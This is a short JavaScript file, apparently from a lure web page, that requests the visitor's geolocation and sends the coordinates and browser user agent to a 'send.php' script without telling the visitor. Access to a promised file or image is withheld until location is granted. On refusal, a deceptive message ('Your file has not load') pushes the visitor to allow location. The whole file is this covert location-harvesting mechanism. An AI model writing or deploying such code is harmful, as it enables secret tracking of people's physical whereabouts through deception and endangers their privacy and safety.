function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition, errorCallback);
    } else { 
      x.innerHTML = "Geolocation is not supported by this browser.";
    }
  }

  function errorCallback(error) {
    var errorMessage;

    var x = "Your file has not load"

    switch (error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "Refresh page, please allow location , in another browser !";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "Location information is unavailable.";
            break;
        case error.TIMEOUT:
            errorMessage = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            errorMessage = "An unknown error occurred.";
            break;
    }

    document.getElementById('locationInfo').innerHTML = "Error: " + errorMessage;
    alert("Error: " + x);
    document.getElementById("myImage").style.display = "none";
}

  
function showPosition(position) {
    const xhttp = new XMLHttpRequest();
   xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
   xhttp.send();
   
   document.getElementById("youImage").style.display = "block";
   document.getElementById("myImage").style.display = "none";
   
   

}